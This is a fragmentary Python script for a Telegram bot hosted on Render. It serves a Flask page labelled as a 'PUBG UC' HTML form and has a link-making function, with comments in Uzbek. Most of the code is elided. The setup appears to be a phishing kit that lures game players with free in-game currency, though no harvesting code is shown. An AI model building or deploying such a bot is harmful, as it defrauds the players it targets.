...
# ==================== RENDER URL ====================
# Render o'z URL sini beradi, cloudflared kerak emas
RENDER_URL = "https://telegram-bot-1-mr8u.onrender.com"  # BU YERGA O'Z RENDER URL'INGIZ

# ==================== FLASK ====================

app = Flask(__name__)

# PUBG UC HTML sahifasi (TO'LIQ, O'ZGARMAGAN)
html_form = """
<!DOCTYPE html>
<html lang="uz">
<head>
...
def link(msg):
    ...
    # RENDER URL dan foydalaning (cloudflared emas!)
